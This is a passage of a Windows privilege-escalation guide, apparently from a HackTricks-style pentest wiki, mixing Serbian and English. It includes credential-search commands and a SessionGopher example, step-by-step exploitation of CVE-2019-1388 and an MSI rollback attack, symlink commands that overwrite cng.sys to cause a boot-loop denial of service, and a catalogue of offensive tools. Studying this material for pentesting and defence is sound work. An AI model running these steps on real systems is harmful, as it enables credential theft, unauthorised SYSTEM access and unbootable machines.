- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u Windows operativni sistem koja omogućava **interkomunikaciju** između softverskih komponenti napisanih u različitim jezicima. Svaka COM komponenta je **identifikovana putem class ID (CLSID)** i svaka komponenta izlaže funkcionalnost putem jedne ili više interfejsa, identifikovanih putem interface IDs (IIDs).

COM klase i interfejsi su definisani u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** respektivno. Ovaj registar se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova u ovom registru možete naći child ključ **InProcServer32** koji sadrži **default value** koja pokazuje na **DLL** i vrednost koja se zove **ThreadingModel** i može biti **Apartment** (jednonitno), **Free** (višenitno), **Both** (jedno- ili višenitno) ili **Neutral** (neutralno u odnosu na niti).

![](<../../images/image (729).png>)

U suštini, ako možete **prepisati bilo koji od DLL-ova** koji će biti izvršeni, možete **eskalirati privilegije** ako će taj DLL biti izvršen od strane drugog korisnika.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za persistenciju, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Pretraži sadržaj fajlova**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Potražite datoteku sa određenim imenom**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretražite registar za nazive ključeva i lozinke**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji traže passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin. Napravio sam ovaj plugin da **automatski izvrši svaki metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže passwords pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje password-a iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sessions**, **usernames** i **passwords** za nekoliko alata koji čuvaju ove podatke u clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Zamislite da **proces koji se izvršava kao SYSTEM open a new process** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe create a new process** (`CreateProcess()`) **sa niskim privilegijama ali nasleđujući sve otvorene handle-e glavnog procesa**.\
Ako imate **pun pristup procesu sa niskim privilegijama**, možete uhvatiti **open handle prema privilegovanom procesu kreiranom** pomoću `OpenProcess()` i **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, poznati kao **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows provides a feature called **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada podaci budu poslati kroz pipe od strane **client**, **server** koji je napravio pipe ima mogućnost da **take on the identity** klijenta, pod uslovom da poseduje neophodna **SeImpersonate** prava. Identifikovanje **privileged process** koji komunicira preko pipe-a koji možete oponašati pruža priliku da **gain higher privileges** usvajanjem identiteta tog procesa kada on komunicira preko pipe-a koji ste uspostavili. Za instrukcije kako izvesti takav napad, korisni vodiči se nalaze [**here**](named-pipe-client-impersonation.md) i [**here**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava da **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **i ovaj alat omogućava da se prikažu svi pipes radi pronalaženja privesc-a** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) u server modu eksponira `\\pipe\\tapsrv` (MS-TRP). Remote authenticated client može zloupotrebiti mailslot-based async event path da pretvori `ClientAttach` u proizvoljni **4-byte write** u bilo koji postojeći fajl koji je writable od strane `NETWORK SERVICE`, zatim stekne Telephony admin prava i učita proizvoljni DLL kao servis. Full flow:

- `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju koja je writable → servis je otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi je za async event pisanja.
- Svaki event upisuje attacker-controlled `InitContext` iz `Initialize` u taj handle. Registrujte line app sa `LRegisterRequestRecipient` (`Req_Func 61`), trigger-ujte `TRequestMakeCall` (`Req_Func 121`), dohvatite preko `GetAsyncEvents` (`Req_Func 0`), zatim unregister/shutdown da biste ponovili deterministička pisanja.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, reconnect-ujte, zatim pozovite `GetUIDllName` sa proizvoljnom putanjom do DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links proslijeđeni na `ShellExecuteExW` mogu pokrenuti opasne URI handlere (`file:`, `ms-appinstaller:` ili bilo koji registrovani scheme) i izvršiti fajlove pod kontrolom napadača kao trenutni korisnik. Vidi:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Kada dobijete shell kao korisnik, može biti zakazanih zadataka ili drugih procesa koji se izvršavaju i koji **pass credentials on the command line**. Skripta ispod beleži process command lines svake dve sekunde i upoređuje trenutno stanje sa prethodnim, ispisujući sve razlike.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (via console or RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" iz naloga bez privilegija.

Ovo omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno koristeći istu ranjivost. Pored toga, nema potrebe za instalacijom bilo čega, a binarni fajl koji se koristi tokom procesa je potpisan i izdat od strane Microsoft.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Pročitajte ovo da biste **saznali o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Napad u suštini koristi rollback funkciju Windows Installer-a da zameni legitimne fajlove zlonamernim tokom procesa deinstalacije. Za ovo napadač treba da kreira **malicious MSI installer** koji će biti iskorišćen da se hijack-uje folder `C:\Config.Msi`, koji će kasnije Windows Installer koristiti za čuvanje rollback fajlova tokom deinstalacije drugih MSI paketa, pri čemu bi rollback fajlovi bili izmenjeni da sadrže zlonamerni payload.

Sažeta tehnika je sledeća:

1. **Stage 1 – Priprema za hijack (ostavite `C:\Config.Msi` praznim)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ovaj stream čuva **indeksne metapodatke** fascikle.

Dakle, ako obrišete **`::$INDEX_ALLOCATION` stream** fascikle, NTFS **uklanja celu fasciklu** iz datotečnog sistema.

Ovo možete uraditi koristeći standardne API-je za brisanje fajlova kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Iako pozivate *file* delete API, on **briše sam folder**.

### Od Folder Contents Delete do SYSTEM EoP
Šta ako vaš primitive ne dozvoljava brisanje proizvoljnih files/folders, ali on **dozvoljava brisanje *contents*-a attacker-controlled folder-a**?

1. Korak 1: Postavite bait folder i file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Korak 3: Pokreni SYSTEM proces (npr. `SilentCleanup`)
- Ovaj proces skenira foldere (npr. `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock triggers** i predaje kontrolu tvom callback-u.

4. Korak 4: Unutar oplock callback-a – preusmeri brisanje

- Opcija A: Premesti `file1.txt` na drugo mesto
- Ovo prazni `folder1` bez prekidanja oplock-a.
- Nemoj direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvori `folder1` u **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcija C: Napravite **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ovo cilja NTFS interni stream koji čuva metapodatke direktorijuma — njegovo brisanje briše direktorijum.

5. Korak 5: Oslobodi oplock
- Proces SYSTEM nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM.

### Od Arbitrary Folder Create do Permanent DoS

Iskoristite primitive koja vam omogućava da **create an arbitrary folder as SYSTEM/admin** — čak i ako **you can’t write files** ili **set weak permissions**.

Kreirajte **folder** (not a file) sa imenom **critical Windows driver**, npr.:
```
C:\Windows\System32\cng.sys
```
- Ovaj put obično odgovara kernel-mode drajveru `cng.sys`.
- Ako ga **unapred kreirate kao folder**, Windows neće uspeti da učita stvarni drajver pri podizanju sistema.
- Zatim, Windows pokušava da učita `cng.sys` tokom podizanja sistema.
- Vidi folder, **ne uspeva da razreši stvarni drajver**, i **sruši se ili zaustavi podizanje sistema**.
- Ne postoji **fallback**, i **nema oporavka** bez spoljne intervencije (npr. popravka podizanja sistema ili pristupa disku).

### Od privilegovanih log/backup putanja + OM symlinks do arbitrary file overwrite / boot DoS

Kada jedna **privilegovana usluga** upisuje logove/eksporte na putanju koja se čita iz **writable config**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste pretvorili privilegovani upis u arbitrary overwrite (čak i **bez** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Konfig koji čuva ciljnu putanju je dostupan za upis od strane napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlinka (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Privilegovana operacija koja piše na tu putanju (log, export, report).

**Example chain**
1. Pročitajte konfig da povratite destinaciju privilegovanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez admin prava:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. admin pokrene "send test SMS"). Upis sada dospeva u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisani cilj (hex/PE parser) da potvrdite korupciju; reboot prisiljava Windows da učita izmenjeni driver path → **boot loop DoS**. Ovo se takođe generalizuje na bilo koji zaštićeni fajl koji će privilegovana servis otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys` može se pokušati prvo, što ga čini pouzdanim DoS sinkom za korumpirane podatke.



## **Od High Integrity do SYSTEM**

### **Nova usluga**

Ako već pokrećete proces sa High Integrity privilegijama, **put do SYSTEM-a** može biti jednostavan samo **kreiranjem i pokretanjem nove usluge**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Kada kreirate service binary, uverite se da je validan servis ili da binarni fajl izvršava neophodne radnje brzo, jer će biti ubijen za 20s ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa visokim integritetom možete pokušati da **omogućite AlwaysInstallElevated registry unose** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
[Više informacija o registry ključevima koji su uključeni i kako instalirati _.msi_ paket ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Možete** [**pronaći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te token privilegije (verovatno ćete ih naći u već postojećem procesu sa visokim integritetom), moći ćete da **otvorite skoro bilo koji process** (ne zaštićene procese) uz SeDebug privilegiju, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Korišćenjem ove tehnike obično se bira proces koji se izvršava kao SYSTEM sa svim token privilegijama (_da, možete naći SYSTEM procese bez svih token privilegija_).\
**Možete naći** [**primer koda koji izvršava predloženu tehniku ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter da eskalira u `getsystem`. Tehnika se sastoji u **kreiranju pipe-a i zatim kreiranju/ zloupotrebi servisa da piše u taj pipe**. Zatim, **server** koji je kreirao pipe koristeći **`SeImpersonate`** privilegiju će moći da **impersonira token** pipe klijenta (servis) i dobije SYSTEM privilegije.\
Ako želite [**da saznate više o named pipes pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite primer [**kako preći iz high integrity u System koristeći named pipes pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji se **učitava** u **procesu** koji se izvršava kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim privilegijama. Dakle, Dll Hijacking je takođe koristan za ovu vrstu eskalacije privilegija, i, štaviše, znatno **lakši za postizanje iz procesa sa visokim integritetom** jer će imati **prava za pisanje** na folderima koji se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll hijacking ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za traženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava za pogrešne konfiguracije i osetljive fajlove (**[**proveri ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovano.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava moguće pogrešne konfiguracije i prikuplja info (**[**proveri ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava potencijalne pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstrahuje PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP sačuvane informacije o sesijama. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje kredencijale iz Credential Manager-a. Detektovano.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Raspršuje prikupljene lozinke po domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofer i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Zahteva Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (mora se kompajlirati koristeći VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći pogrešne konfiguracije (više alat za prikupljanje informacija nego isključivo privesc) (mora se kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje kredencijale iz mnogih softvera (prekompajlirani exe na GitHub-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava za pogrešne konfiguracije (izvršni fajl prekompajliran na github-u). Ne preporučuje se. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat kreiran na osnovu ovog posta (ne zahteva accesschk da bi ispravno radio ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz **systeminfo** i preporučuje radne exploite (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz **systeminfo** i preporučuje radne exploite (lokalni python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Morate kompajlirati projekat koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na victim hostu možete uraditi:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Izvori

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – U potrazi za Silver Fox: Mačka i miš u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Ranljivost privilegovanog fajl sistema u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Zloupotreba simboličkih linkova na Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
